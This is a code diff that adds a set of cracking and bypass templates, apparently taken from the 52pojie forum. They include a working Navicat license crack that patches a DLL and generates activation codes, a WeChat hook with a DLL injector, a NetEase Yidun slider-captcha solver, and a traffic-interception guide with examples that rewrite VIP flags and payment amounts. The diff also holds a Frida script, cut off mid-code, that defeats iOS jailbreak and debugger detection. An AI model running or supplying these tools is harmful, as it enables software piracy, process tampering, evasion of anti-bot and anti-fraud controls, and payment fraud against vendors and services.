@@ -4731,6 +4731,2928 @@ if __name__ == '__main__':
     print("使用: frida -U -f <package> -l so_loader_trace.js --no-pause")
 `,
 
+      // ══ 吾爱精华工具集（扩展包）══
+      'pojie:navicat': `# 🔑 Navicat 17.3.x 激活 — lief补丁DLL+RSA自签
+# 目标: {param || 'libcc.dll'}
+"""
+19_navicat_crack.py
+Navicat 17.3.x 激活补丁 — lief patch DLL + RSA自签
+来源: https://www.52pojie.cn/thread-2067864-1-1.html
+依赖: pip install lief pycryptodome
+"""
+
+import lief, base64, os
+from lief.PE import Binary, Section
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5
+
+PE_FILE_PATH = "libcc.dll"  # 在 Navicat 安装目录下运行
+
+# 原始字节码（待替换）
+ORIGINAL_BYTECODE = b"".join([
+    b"\\x48\\x8b\\xd0\\x48\\x8b\\xcf\\xff\\xd3\\x48\\x89\\x46\\x20\\x48\\x8b\\x55\\x10",
+    b"\\x48\\x83\\xfa\\x0f\\x76\\x34\\x48\\xff\\xc2\\x48\\x8b\\x4d\\xf8\\x48\\x8b\\xc1",
+    b"\\x48\\x81\\xfa\\x00\\x10\\x00\\x00\\x72\\x1c\\x48\\x83\\xc2\\x27\\x48\\x8b\\x49",
+    b"\\xf8\\x48\\x2b\\xc1\\x48\\x83\\xc0\\xf8\\x48\\x83",
+])
+
+# 补丁字节码（lea rcx,[rip+offset] 注入公钥地址 + NOP填充）
+PATCH_BYTECODE = b"".join([
+    b"\\x48\\x8d\\x0d\\x00\\x00\\x00\\x00\\x48\\x89\\x08\\x48\\x89\\xc2\\x48\\x89\\xf9",
+    b"\\xff\\xd3\\x48\\x89\\x46\\x20\\x48\\x8b\\x55\\x10\\x90\\x90\\x90\\x90\\x90\\x90",
+    b"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90",
+    b"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90",
+    b"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90",
+])
+
+def find_bytes(pe_file: str) -> int:
+    with open(pe_file, "rb") as f:
+        data = f.read()
+    offset = data.find(ORIGINAL_BYTECODE)
+    if offset == -1:
+        raise ValueError("原始字节码未找到，版本可能不匹配")
+    return offset
+
+def add_pkey_section(pe: Binary, public_key: str) -> None:
+    sec = Section(".pkey")
+    payload = public_key.encode() + b"\\0"
+    sec.content = list(payload)
+    sec.virtual_size = len(payload)
+    sec.characteristics = Section.CHARACTERISTICS.MEM_READ
+    pe.add_section(sec)
+
+def calc_rip_offset(pe: Binary, patch_offset: int) -> int:
+    text = pe.get_section(".text")
+    pkey = pe.get_section(".pkey")
+    text_foa = text.pointerto_raw_data
+    text_va  = text.virtual_address
+    pkey_va  = pkey.virtual_address
+    # lea rcx, [rip+offset]  —— rip 在指令后7字节
+    return pkey_va - (text_va + patch_offset - text_foa + 7)
+
+def patch_file(pe_file: str, patch_offset: int, patch_bytecode: bytes) -> None:
+    with open(pe_file, "rb+") as f:
+        f.seek(patch_offset)
+        f.write(patch_bytecode)
+
+def pkcs1_v15_private_pad(message: bytes, key: RSA.RsaKey) -> bytes:
+    k = key.size_in_bytes()
+    ps = b'\\xFF' * (k - len(message) - 3)
+    return b'\\x00\\x01' + ps + b'\\x00' + message
+
+def rsa_private_encrypt(message: bytes, priv_pem: str) -> str:
+    key = RSA.import_key(priv_pem)
+    em = pkcs1_v15_private_pad(message, key)
+    c  = pow(int.from_bytes(em,'big'), key.d, key.n)
+    return base64.b64encode(c.to_bytes(key.size_in_bytes(),'big')).decode()
+
+def decrypt_request(reg: str, priv_pem: str) -> str:
+    key = RSA.import_key(priv_pem)
+    cipher = PKCS1_v1_5.new(key)
+    plain  = cipher.decrypt(base64.b64decode(reg), None)
+    if plain is None:
+        raise ValueError("解密失败")
+    return plain.decode()
+
+def main():
+    if not os.path.exists(PE_FILE_PATH):
+        print(f"[!] {PE_FILE_PATH} 不存在，请在 Navicat 安装目录运行")
+        return
+
+    print("=== Navicat 17.3.x 激活工具 ===")
+    print("请先断网并关闭所有 Navicat 进程")
+    if input("确认继续? (y/n): ").lower() != 'y':
+        return
+
+    # Step 1: 备份
+    bak = PE_FILE_PATH + ".bak"
+    if not os.path.exists(bak):
+        os.rename(PE_FILE_PATH, bak)
+        print(f"[+] 已备份 → {bak}")
+
+    # Step 2: 生成密钥对
+    key = RSA.generate(2048)
+    priv_pem = key.export_key().decode()
+    pub_pem  = key.publickey().export_key().decode()
+    public_key = "".join(pub_pem.splitlines()[1:-1])  # 去掉 header/footer
+    print("[+] RSA 2048 密钥对已生成")
+
+    # Step 3: 找补丁位置
+    patch_offset = find_bytes(bak)
+    print(f"[+] 找到补丁位置: {hex(patch_offset)}")
+
+    # Step 4: 解析 PE，添加公钥 section，计算 RIP 偏移
+    pe = lief.parse(bak)
+    add_pkey_section(pe, public_key)
+    rip_off = calc_rip_offset(pe, patch_offset)
+    print(f"[+] RIP 偏移: {hex(rip_off)}")
+
+    # Step 5: 写入偏移到补丁，应用
+    patch_bc = PATCH_BYTECODE.replace(b"\\x00\\x00\\x00\\x00", rip_off.to_bytes(4,'little'))
+    pe.write(PE_FILE_PATH)
+    patch_file(PE_FILE_PATH, patch_offset, patch_bc)
+    print("[+] 补丁应用完成")
+
+    # Step 6: 等待离线激活请求
+    print("\\n[*] 不要关闭此脚本！")
+    print("[*] 运行 Navicat → 输入以下注册码 → 选择离线激活:")
+    print("    NAVMIKCHCWNIHS3Q")
+    print("[*] 将离线激活页面显示的请求码粘贴到下方:")
+    reg_code = input("请求码: ").strip()
+
+    # Step 7: 生成激活码
+    try:
+        plain = decrypt_request(reg_code, priv_pem)
+        print(f"[+] 解密结果: {plain}")
+        # 用私钥"加密"响应（PKCS#1 v1.5 私钥签名语义）
+        response = rsa_private_encrypt(plain.encode(), priv_pem)
+        print("\\n[+] 激活码:")
+        print(response)
+    except Exception as e:
+        print(f"[-] 失败: {e}")
+
+if __name__ == '__main__':
+    main()
+`,
+
+      'pojie:bilibili_dl': `// 🎬 B站视频下载油猴脚本 (m4s+ffmpeg合并)
+// 安装到 Tampermonkey 即用，支持 {param || 'www.bilibili.com'}
+// ==UserScript==
+// @name         B站视频下载器（稳定版）
+// @namespace    http://tampermonkey.net/
+// @version      3.0
+// @description  稳定下载B站音视频，提供本地合并指南
+// @match        https://www.bilibili.com/video/*
+// @match        https://www.bilibili.com/bangumi/play/*
+// @grant        none
+// @run-at       document-end
+// ==/UserScript==
+// 来源: https://www.52pojie.cn/thread-2069803-1-1.html
+
+(function() {
+'use strict';
+
+class BilibiliDownloader {
+    constructor() {
+        this.playInfo = null;
+        this.init();
+    }
+
+    init() {
+        this.addGlobalStyles();
+        this.createDownloadButton();
+        // 延迟查找，等页面加载
+        setTimeout(() => this.findPlayInfo(), 2000);
+        // 监听 XHR/fetch 响应动态获取
+        this.hookNetworkRequests();
+    }
+
+    // === 核心：提取播放信息 ===
+    findPlayInfo() {
+        // 方法1: 直接读 window 对象
+        if (window.__playinfo__) {
+            this.playInfo = window.__playinfo__;
+            return;
+        }
+        // 方法2: 扫描 script 标签
+        const scripts = document.querySelectorAll('script');
+        for (const script of scripts) {
+            const content = script.textContent || '';
+            if (!content.includes('window.__playinfo__')) continue;
+            const patterns = [
+                /window\\.__playinfo__\\s*=\\s*({[\\s\\S]*?})\\s*;/,
+                /window\\.__playinfo__\\s*=\\s*({.*?})(?=window\\.|<\\/script>|$)/
+            ];
+            for (const pat of patterns) {
+                const m = content.match(pat);
+                if (m) {
+                    try { this.playInfo = JSON.parse(m[1]); return; } catch(e) {}
+                }
+            }
+        }
+    }
+
+    // 拦截 XHR/fetch 动态获取播放信息
+    hookNetworkRequests() {
+        const self = this;
+        const origXHR = XMLHttpRequest.prototype.open;
+        XMLHttpRequest.prototype.open = function(method, url, ...args) {
+            if (url && url.includes('player.bilibili.com/x/player/wbi/playurl')) {
+                this.addEventListener('load', function() {
+                    try {
+                        const data = JSON.parse(this.responseText);
+                        if (data.data?.dash) { self.playInfo = data; }
+                    } catch(e) {}
+                });
+            }
+            return origXHR.call(this, method, url, ...args);
+        };
+    }
+
+    // === 提取视频/音频 URL ===
+    getVideos() {
+        const dash = this.playInfo?.data?.dash;
+        if (!dash) return [];
+        return (dash.video || []).map(v => ({
+            id: v.id, codecs: v.codecs, bandwidth: v.bandwidth,
+            baseUrl: v.baseUrl || v.base_url,
+            backupUrl: v.backupUrl || v.backup_url || []
+        }));
+    }
+
+    getAudios() {
+        const dash = this.playInfo?.data?.dash;
+        if (!dash) return [];
+        return (dash.audio || []).map(a => ({
+            id: a.id, codecs: a.codecs, bandwidth: a.bandwidth,
+            baseUrl: a.baseUrl || a.base_url
+        }));
+    }
+
+    // === 触发下载 ===
+    downloadFile(url, filename) {
+        // 需要带 Referer 头，直接 fetch 下载
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename;
+        a.target = '_blank';
+        a.click();
+    }
+
+    // === 创建悬浮下载按钮 ===
+    createDownloadButton() {
+        const btn = document.createElement('button');
+        btn.style.cssText = \`
+            position:fixed;bottom:20px;right:20px;
+            background:#00a1d6;color:white;border:none;
+            border-radius:20px;padding:10px 16px;font-size:14px;
+            font-weight:bold;cursor:pointer;z-index:10000;
+            box-shadow:0 2px 10px rgba(0,0,0,.3);
+        \`;
+        btn.textContent = '⬇ 下载视频';
+        btn.onclick = () => this.showPanel();
+        document.body.appendChild(btn);
+    }
+
+    showPanel() {
+        if (!this.playInfo) {
+            this.findPlayInfo();
+            if (!this.playInfo) { alert('未找到播放信息，请等待视频完全加载后重试'); return; }
+        }
+        const old = document.getElementById('bili-dl-panel');
+        if (old) { old.remove(); return; }
+
+        const videos = this.getVideos();
+        const audios = this.getAudios();
+
+        const panel = document.createElement('div');
+        panel.id = 'bili-dl-panel';
+        panel.style.cssText = \`
+            position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
+            background:rgba(0,0,0,.95);color:white;border:2px solid #00a1d6;
+            border-radius:10px;padding:20px;z-index:10001;
+            width:500px;max-width:90vw;max-height:80vh;overflow-y:auto;
+        \`;
+
+        let html = '<button onclick="document.getElementById(\\'bili-dl-panel\\').remove()" style="position:absolute;top:10px;right:15px;background:none;border:none;color:white;font-size:20px;cursor:pointer">×</button>';
+        html += '<h3 style="color:#00a1d6;text-align:center;margin:0 0 15px">🎬 B站视频下载</h3>';
+
+        // 视频列表
+        html += \`<div style="color:#ffa500;font-weight:bold;margin-bottom:8px">🎥 视频流 (\${videos.length}个)</div>\`;
+        videos.forEach((v, i) => {
+            html += \`<div style="background:rgba(255,255,255,.05);padding:8px;margin-bottom:6px;border-left:3px solid #00a1d6">
+                <span style="background:#ffa500;color:black;padding:1px 5px;border-radius:3px;font-size:11px">\${v.id}P</span>
+                <span style="font-size:12px;margin-left:8px">\${v.codecs} \${v.bandwidth?'('+Math.round(v.bandwidth/1000)+'kbps)':''}</span>
+                <button onclick="window._biliDl.downloadFile('\${v.baseUrl}','video_\${v.id}.mp4')"
+                    style="float:right;background:#27ae60;color:white;border:none;padding:3px 8px;border-radius:3px;cursor:pointer;font-size:12px">下载</button>
+            </div>\`;
+        });
+
+        // 音频列表
+        html += \`<div style="color:#ffa500;font-weight:bold;margin:12px 0 8px">🔊 音频流 (\${audios.length}个)</div>\`;
+        audios.forEach((a, i) => {
+            html += \`<div style="background:rgba(255,255,255,.05);padding:8px;margin-bottom:6px;border-left:3px solid #00a1d6">
+                <span style="font-size:12px">\${a.codecs} \${a.bandwidth?'('+Math.round(a.bandwidth/1000)+'kbps)':''}</span>
+                <button onclick="window._biliDl.downloadFile('\${a.baseUrl}','audio_\${a.id}.m4a')"
+                    style="float:right;background:#27ae60;color:white;border:none;padding:3px 8px;border-radius:3px;cursor:pointer;font-size:12px">下载</button>
+            </div>\`;
+        });
+
+        // ffmpeg 合并命令
+        html += \`<div style="background:rgba(255,255,255,.1);padding:12px;border-radius:5px;margin-top:12px;font-size:12px">
+            <div style="color:#ffa500;margin-bottom:6px">💡 ffmpeg 合并命令</div>
+            <code style="background:#1a1a1a;color:#0f0;display:block;padding:8px;border-radius:3px;font-size:11px">
+            ffmpeg -i video.mp4 -i audio.m4a -c copy output.mp4
+            </code>
+        </div>\`;
+
+        panel.innerHTML = html;
+        document.body.appendChild(panel);
+    }
+
+    addGlobalStyles() {}
+}
+
+window._biliDl = new BilibiliDownloader();
+})();
+`,
+
+      'pojie:wx_revoke': `// 💬 微信防撤回消息 DLL Hook (x64)
+// 目标: {param || 'WeChat.exe'}
+// 21_wechat_revoke_hook.cpp
+// 微信防撤回消息 DLL Hook — Windows 版
+// 来源: https://www.52pojie.cn/thread-1947110-1-1.html
+//
+// 原理:
+// 撤回消息流程: SyncMgr::ProcessNewXMLMsg(msgType=4, ...) → sub_182300AE0 (执行撤回)
+// Hook: 拦截 ProcessNewXMLMsg，当 a1==4 时直接 return 0，不执行撤回
+// 注入: DLL 注入到 WeChat.exe 进程
+
+// === 关键数据结构 ===
+// 撤回消息 xml 类型: revokemsg (由 SyncMgr::GetNewXMLType 识别)
+// ProcessNewXMLMsg case 4 → sub_182300AE0 执行删除
+// ProcessNewXMLMsg case 0x21 / 0x24 → 其他 xml 消息类型
+
+/*
+// 定位方法（IDA）:
+// 1. 搜索字符串 "ChatRevokeMgr"
+// 2. 找 "rv %s %d" 日志 → ChatRevokeMgr::AddOrUpdateRevokeMsg
+// 3. 往上找 ProcessNewXMLMsg（switch case 4）
+// 4. 找 "SyncMgr.cpp" 3081 → GetNewXMLType，定位 "revokemsg"
+
+// ProcessNewXMLMsg 函数签名 (v3911):
+// char __fastcall SyncMgr::ProcessNewXMLMsg(int a1, __int64 a2, __int64 a3, __int64* a4)
+// 偏移需根据实际版本在 IDA 中确定
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+// 函数类型定义
+typedef char(__fastcall* _ProcessNewXMLMsg)(
+    int a1,       // xml 消息类型，4=撤回
+    __int64 a2,
+    __int64 a3,
+    __int64* a4
+);
+
+// 保存原函数指针
+_ProcessNewXMLMsg fProcessNewXMLMsg = nullptr;
+
+// Hook 函数：类型4(撤回)直接拦截
+char __fastcall MyProcessNewXMLMsg(
+    int a1,
+    __int64 a2,
+    __int64 a3,
+    __int64* a4
+) {
+    if (a1 == 4) {
+        // 直接返回，不执行撤回
+        return 0;
+    }
+    return fProcessNewXMLMsg(a1, a2, a3, a4);
+}
+
+// 内存补丁安装（替换函数开头跳转指令）
+bool InstallHook(LPVOID targetAddr, LPVOID hookAddr) {
+    DWORD old;
+    VirtualProtect(targetAddr, 14, PAGE_EXECUTE_READWRITE, &old);
+
+    // x64 绝对跳转: FF 25 00 00 00 00 [8字节地址]
+    BYTE patch[14] = {0xFF, 0x25, 0x00, 0x00, 0x00, 0x00};
+    *(PVOID*)(patch + 6) = hookAddr;
+    memcpy(targetAddr, patch, 14);
+
+    VirtualProtect(targetAddr, 14, old, &old);
+    return true;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hModule);
+        AllocConsole();
+        freopen("CONOUT$", "w", stdout);
+
+        HMODULE wechat = GetModuleHandleW(L"WeChatWin.dll");
+        if (!wechat) {
+            printf("[-] WeChatWin.dll 未加载\\n");
+            return TRUE;
+        }
+
+        // 偏移需根据版本用 IDA 确定：
+        // 在 WeChatWin.dll 中搜索 "revokemsg" 字符串引用，找 ProcessNewXMLMsg
+        // v3.9.11 示例偏移（需自行验证）:
+        DWORD64 baseAddr = (DWORD64)wechat;
+        DWORD64 funcOffset = 0x0;  // TODO: 填入 ProcessNewXMLMsg 的偏移
+        
+        if (funcOffset == 0) {
+            printf("[!] 请用 IDA 找到 ProcessNewXMLMsg 偏移后填入\\n");
+            printf("[*] 方法: 搜索字符串 revokemsg → 找引用 → 往上找 switch(a1) case 4\\n");
+            return TRUE;
+        }
+
+        LPVOID target = (LPVOID)(baseAddr + funcOffset);
+        fProcessNewXMLMsg = (_ProcessNewXMLMsg)target;
+
+        if (InstallHook(target, (LPVOID)MyProcessNewXMLMsg)) {
+            printf("[+] 防撤回 Hook 安装成功！偏移: %llx\\n", funcOffset);
+        }
+    }
+    return TRUE;
+}
+
+/* ===== 注入器（独立程序）=====
+#include <TlHelp32.h>
+
+DWORD GetProcessId(const wchar_t* name) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W pe = {sizeof(pe)};
+    if (Process32FirstW(snap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, name) == 0) {
+                CloseHandle(snap);
+                return pe.th32ProcessID;
+            }
+        } while (Process32NextW(snap, &pe));
+    }
+    CloseHandle(snap);
+    return 0;
+}
+
+void InjectDll(DWORD pid, const wchar_t* dllPath) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    SIZE_T sz = (wcslen(dllPath)+1) * sizeof(wchar_t);
+    LPVOID mem = VirtualAllocEx(hProc, NULL, sz, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProc, mem, dllPath, sz, NULL);
+    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW"),
+        mem, 0, NULL);
+    WaitForSingleObject(hThread, 5000);
+    VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+}
+
+int main() {
+    DWORD pid = GetProcessId(L"WeChat.exe");
+    if (!pid) { printf("WeChat.exe 未运行\\n"); return 1; }
+    InjectDll(pid, L"C:\\\\path\\\\to\\\\WechatRevoke.dll");
+    printf("注入成功\\n");
+}
+*/
+`,
+
+      'pojie:yidun': `# 🧩 易盾Web滑块 — ddddocr识别+仿人类轨迹
+# 目标: {param || 'https://c.dun.163.com'}
+"""
+22_yidun_slider.py
+最新易盾 Web 滑块逆向 — 轨迹生成 + 图像识别
+来源: https://www.52pojie.cn/thread-2108119-1-1.html
+提示: 识别推荐用 ddddocr（免费、成功率高）
+"""
+
+import math, random, time, base64
+import requests
+
+# pip install ddddocr requests
+try:
+    import ddddocr
+    ocr = ddddocr.DdddOcr(det=False, ocr=False, show_ad=False)
+    HAS_OCR = True
+except:
+    HAS_OCR = False
+
+# ============================================================
+# 核心：仿人类滑块轨迹生成（加速-超冲-回退）
+# ============================================================
+def generate_trajectory(target_x: int) -> list:
+    """
+    生成仿人类鼠标轨迹
+    target_x: 需要滑动的像素距离（识别结果 +20 偏移）
+    返回: [[x, y, timestamp, 1], ...] 格式
+    """
+    num_points = max(45, int(target_x / 1.5) + 20)
+    trajectory = []
+    current_x = current_y = 0
+    current_time = 67 + random.randint(20, 50)
+
+    # 超冲量：滑过目标位置 8%~18%，再退回
+    overshoot = target_x * random.uniform(0.08, 0.18)
+    max_x = target_x + overshoot
+
+    for i in range(num_points):
+        progress = i / (num_points - 1)
+
+        # 速度曲线：前70%加速，后30%减速回退
+        if progress < 0.7:
+            speed_factor = 1.0 - (progress * 0.3)
+            time_inc = random.uniform(7, 9)
+        else:
+            speed_factor = 0.3 + ((progress - 0.7) * 0.5)
+            time_inc = random.uniform(12, 20)
+
+        # 随机停顿（模拟真实操作抖动）
+        if random.random() < 0.05:
+            time_inc += random.uniform(15, 40)
+
+        # x 轨迹：先超冲，再回退
+        if progress < 0.75:
+            target_x_now = max_x * (progress / 0.75)
+        else:
+            retreat_progress = (progress - 0.75) / 0.25
+            target_x_now = max_x - (overshoot * retreat_progress)
+
+        # 微抖动
+        x_offset = random.uniform(-2, 2) * (1 - abs(progress - 0.5))
+        current_x = target_x_now + x_offset
+
+        # y 轨迹：正弦波 + 随机噪声
+        y_base = math.sin(progress * 10) * 2
+        y_noise = random.uniform(-1.5, 1.5) * (0.5 + 0.5 * progress)
+        current_y = y_base + y_noise
+
+        current_time += time_inc
+
+        trajectory.append([
+            int(round(current_x)),
+            int(round(current_y)),
+            int(round(current_time)),
+            1
+        ])
+
+    # 最后一点精确到目标
+    trajectory[-1][0] = target_x
+    return trajectory
+
+
+# ============================================================
+# ddddocr 识别缺口位置
+# ============================================================
+def get_gap_position(bg_img: bytes, slide_img: bytes) -> int:
+    """
+    bg_img: 背景图（带缺口）的二进制数据
+    slide_img: 滑块图的二进制数据
+    返回: 缺口 x 坐标（像素）
+    """
+    if not HAS_OCR:
+        raise RuntimeError("pip install ddddocr")
+    res = ocr.slide_match(slide_img, bg_img, simple_target=True)
+    x = res['target'][0]
+    return x
+
+
+# ============================================================
+# 易盾滑块完整流程
+# ============================================================
+class YidunSlider:
+    def __init__(self, session: requests.Session = None):
+        self.session = session or requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        })
+
+    def get_captcha(self, captcha_id: str) -> dict:
+        """获取验证码图片"""
+        url = f'https://c.dun.163.com/load?captchaId={captcha_id}&width=320&clientType=web&version=1.2.4'
+        r = self.session.get(url)
+        return r.json()
+
+    def solve(self, captcha_id: str) -> dict:
+        """
+        完整求解流程
+        返回需要提交的参数
+        """
+        # Step 1: 获取验证码
+        data = self.get_captcha(captcha_id)
+        bg_url = data.get('bg')        # 背景图 URL
+        slide_url = data.get('jigsawImageUrl')  # 滑块图 URL
+
+        if not bg_url or not slide_url:
+            raise ValueError("未获取到图片 URL")
+
+        # Step 2: 下载图片
+        bg_img    = self.session.get(bg_url).content
+        slide_img = self.session.get(slide_url).content
+
+        # Step 3: 识别缺口
+        gap_x = get_gap_position(bg_img, slide_img)
+        # 注意：易盾识别结果需 +20 偏移（不同平台偏移量不同，需自行校准）
+        target_x = gap_x + 20
+
+        # Step 4: 生成轨迹
+        trajectory = generate_trajectory(target_x)
+
+        # Step 5: 返回需要提交的数据
+        token = data.get('token', '')
+        return {
+            'token': token,
+            'x': target_x,
+            'y': 5,
+            'trajectory': trajectory,
+            'bgImageWidth': 320,
+            'bgImageHeight': 160,
+            'startSlidingTime': int(time.time() * 1000),
+            'entryTime': int(time.time() * 1000) + trajectory[-1][2],
+        }
+
+    def verify(self, captcha_id: str, solve_result: dict) -> bool:
+        """提交验证（需根据具体站点接口调整）"""
+        url = 'https://c.dun.163.com/fu'
+        payload = {
+            'captchaId': captcha_id,
+            'token': solve_result['token'],
+            'x': solve_result['x'],
+            # ... 根据实际接口补充其他参数
+        }
+        r = self.session.post(url, json=payload)
+        result = r.json()
+        return result.get('result') == True
+
+
+# ============================================================
+# 使用示例
+# ============================================================
+if __name__ == '__main__':
+    # 测试轨迹生成
+    traj = generate_trajectory(185)
+    print(f"生成轨迹: {len(traj)} 个点")
+    print(f"起点: {traj[0]}, 终点: {traj[-1]}")
+    print(f"总耗时: {traj[-1][2]} ms")
+
+    # 测试识别（需要图片文件）
+    # with open('bg.png','rb') as f: bg = f.read()
+    # with open('slide.png','rb') as f: slide = f.read()
+    # gap = get_gap_position(bg, slide)
+    # print(f"缺口位置: {gap}px，目标: {gap+20}px")
+`,
+
+      'pojie:reqable': `# 📡 Reqable+AI Agent 自动化抓包分析 (MCP配置)
+# 工具: {param || 'Reqable 3.2.7+'}
+# 23_reqable_ai_traffic.md
+# Reqable + AI Agent 自动化分析网络流量
+# 来源: https://www.52pojie.cn/thread-2117217-1-1.html
+# MCP开源: https://github.com/reqable/reqable-mcp-server
+
+## MCP 配置（VS Code / Claude Code / Cursor 通用）
+
+\`\`\`json
+{
+  "servers": {
+    "chrome-devtools": {
+      "command": "npx",
+      "args": ["-y", "chrome-devtools-mcp@latest"],
+      "type": "stdio"
+    },
+    "reqable": {
+      "type": "stdio",
+      "command": "/Applications/Reqable.app/Contents/Helpers/mcp-server",
+      "args": []
+    }
+  }
+}
+\`\`\`
+
+Windows 路径: \`C:\\\\Program Files\\\\Reqable\\\\mcp-server.exe\`
+
+## 可用 AI 指令示例
+
+\`\`\`
+# 自动抓包
+启动Reqable抓包，然后用Chrome打开 reqable.com，禁用浏览器缓存
+
+# 分析指定请求
+分析Reqable中ID为386的这条请求
+
+# 创建接口测试
+在Reqable中给这条请求创建一个API测试
+
+# 重写规则（等价 Charles Map Local）
+创建一个重写规则，将reqable.com网站内容中的字符Reqable全部修改成Awesome
+
+# 自动编写脚本保存图片资源
+写一个Reqable脚本并启用。
+将网站reqable.com中所有的图片资源保存到当前用户Downloads目录，
+保存文件夹用域名命名。刷新网页让脚本执行。
+\`\`\`
+
+## Reqable 脚本 Python 模板
+
+\`\`\`python
+# Reqable 脚本 - 保存图片资源
+import os
+from pathlib import Path
+
+def onResponse(context, request, response):
+    url = request.url
+    # 过滤图片资源
+    if any(url.endswith(ext) for ext in ['.png', '.jpg', '.jpeg', '.gif', '.webp', '.svg']):
+        from urllib.parse import urlparse
+        parsed = urlparse(url)
+        domain = parsed.netloc
+        path = parsed.path.lstrip('/')
+        
+        save_dir = Path.home() / 'Downloads' / domain / os.path.dirname(path)
+        save_dir.mkdir(parents=True, exist_ok=True)
+        
+        filename = os.path.basename(path) or 'image'
+        final_path = save_dir / filename
+        
+        with open(final_path, 'wb') as f:
+            f.write(response.body)
+        
+        # 给请求添加备注和绿色高亮（Reqable 专属）
+        context.comment = f'Saved to {final_path}'
+        from reqable import Highlight
+        context.highlight = Highlight.green
+
+def onRequest(context, request):
+    pass
+\`\`\`
+
+## 实战场景
+
+| 场景 | AI 指令 |
+|------|---------|
+| 抓微信小程序接口 | 启动抓包，打开微信小程序XX，找sign参数的生成请求 |
+| 分析 APP 登录加密 | 分析包含login的POST请求，找加密参数 |
+| 修改响应数据 | 创建重写规则，把 "vip":false 改成 "vip":true |
+| 拦截并修改请求 | 创建断点规则，拦截 /api/pay 接口，修改金额为0.01 |
+| 批量保存资源 | 保存所有 .m3u8 和 .ts 文件到指定目录 |
+`,
+
+      'pojie:ios_env': `// 🍎 iOS商业级环境检测绕过 (腾讯AE Framework)
+// 目标APP: {param || 'com.target.app'}
+// 用法: frida -U -f {param || 'com.target.app'} -l bypass_ios_env.js
+// 24_ios_env_detection_bypass.js
+// iOS 商业级环境检测分析与绕过 — 基于某讯 AE Framework
+// 来源: https://www.52pojie.cn/thread-2115245-1-1.html
+//
+// 检测框架结构:
+// anort.framework → anogs.framework (底层加密/检测库)
+// 字符串全部加密存储，运行时解密
+//
+// 检测项目（从 IDA 逆向总结）:
+// 1. stat/access 系统调用检测越狱文件 (su, Cydia, substrate等)
+// 2. readlink 检测符号链接
+// 3. opendir 扫描特定目录
+// 4. sysctl 检测调试器 (P_TRACED)
+// 5. task_info 检测内存异常
+// 6. dyld 检测注入的动态库
+
+// === 字符串解密算法还原 ===
+// 表结构: key(1B) + len^key(1B) + cipher[i]^rolling_key
+// rolling key 更新: key = (((key + i) ^ xor_const) + add_const) & 0xff
+function decryptString(table, offset, xorConst, addConst) {
+    const key = table[offset];
+    const len = table[offset + 1] ^ key;
+    let result = '';
+    let rollingKey = key;
+    for (let i = 0; i < len; i++) {
+        const byte = table[offset + 2 + i] ^ rollingKey;
+        result += String.fromCharCode(byte);
+        rollingKey = (((rollingKey + i) ^ xorConst) + addConst) & 0xff;
+    }
+    return result;
+}
+
+// === Frida 绕过 iOS 环境检测 ===
+const FRIDA_BYPASS_IOS = \`
+// 绕过腾讯 AE Framework 环境检测（iOS）
+// Hook 底层系统调用，让检测失效
+
+(function() {
+    'use strict';
+
+    // 1. Hook stat/access — 欺骗越狱文件不存在
+    const JAILBREAK_PATHS = [
+        '/Applications/Cydia.app',
+        '/usr/sbin/sshd',
+        '/usr/bin/sshd',
+        '/bin/bash',
+        '/etc/apt',
+        '/private/var/lib/apt',
+        '/Library/MobileSubstrate/MobileSubstrate.dylib',
+        '/usr/libexec/sftp-server',
+        '/etc/ssh/sshd_config',
+        '/var/cache/apt',
+        '/var/lib/dpkg/info',
+        '/var/lib/dpkg/status',
+        '/bin/sh',
+        '/usr/bin/cycript',
+        '/var/mobile/Media/.evasi0n7_installed',
+    ];
+
+    const libSystem = Process.getModuleByName('libSystem.B.dylib');
+
+    // Hook access()
+    const access = libSystem.getExportByName('access');
+    Interceptor.attach(access, {
+        onEnter(args) {
+            const path = args[0].readUtf8String();
+            if (JAILBREAK_PATHS.some(p => path && path.includes(p.split('/').pop()))) {
+                this.fake = true;
+                console.log('[+] Block access:', path);
+            }
+        },
+        onLeave(retval) {
+            if (this.fake) retval.replace(-1);  // 假装文件不存在
+        }
+    });
+
+    // Hook stat()
+    const stat = libSystem.getExportByName('stat$INODE64') || libSystem.getExportByName('stat');
+    if (stat) {
+        Interceptor.attach(stat, {
+            onEnter(args) {
+                const path = args[0].readUtf8String();
+                if (JAILBREAK_PATHS.some(p => path && path.includes(p.split('/').pop()))) {
+                    this.fake = true;
+                }
+            },
+            onLeave(retval) {
+                if (this.fake) retval.replace(-1);
+            }
+        });
+    }
+
+    // Hook readlink() — 欺骗符号链接
+    const readlink = libSystem.getExportByName('readlink');
+    Interceptor.attach(readlink, {
+        onEnter(args) {
+            const path = args[0].readUtf8String();
+            if (path && (path.includes('Applications') || path.includes('usr'))) {
+                this.fake = true;
+            }
+        },
+        onLeave(retval) {
+            if (this.fake) retval.replace(-1);
+        }
+    });
+
+    // 2. Hook sysctl — 防调试检测
+    const sysctl = libSystem.getExportByName('sysctl');
+    Interceptor.attach(sysctl, {
+        onEnter(args) {
+            // P_TRACED flag 检测
+            const mib = args[0];
+            if (mib.readInt() === 1 && mib.add(4).readInt() === 14) {  // CTL_KERN, KERN_PROC
